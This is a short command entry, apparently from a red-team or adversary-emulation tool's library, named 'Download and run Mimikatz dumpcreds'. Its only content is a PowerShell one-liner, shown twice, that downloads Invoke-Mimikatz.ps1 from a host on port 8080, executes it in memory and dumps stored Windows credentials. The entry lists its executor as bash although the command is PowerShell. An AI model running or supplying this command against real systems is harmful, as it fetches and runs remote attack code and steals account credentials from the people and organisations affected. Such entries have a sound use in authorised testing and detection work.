---
id: 43cc330d-8d52-43ff-9d77-b2a61c75ad96
name: Download and run Mimikatz dumpcreds
type: command
executor: bash
data: 'IEX(New-Object Net.Webclient).DownloadString(''http://192.168.1.10:8080/tools/ps/Invoke-Mimikatz.ps1'');Invoke-Mimikatz
  -DumpCreds

  '
output: null
created_at: '2020-07-15T19:05:44.361876+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Download and run Mimikatz dumpcreds

```bash
IEX(New-Object Net.Webclient).DownloadString('http://192.168.1.10:8080/tools/ps/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds

```


